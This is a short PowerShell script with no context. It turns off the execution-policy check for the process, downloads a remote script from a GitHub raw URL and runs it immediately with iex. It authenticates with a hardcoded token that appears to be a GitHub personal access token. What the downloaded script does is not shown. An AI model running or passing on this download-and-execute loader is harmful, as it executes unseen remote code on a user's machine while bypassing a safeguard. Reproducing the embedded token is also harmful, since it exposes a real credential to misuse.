Set-ExecutionPolicy Bypass -Scope Process -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex (Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/Playtool/test/main/test.ps1' -Headers @{ Authorization = "Bearer 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" })
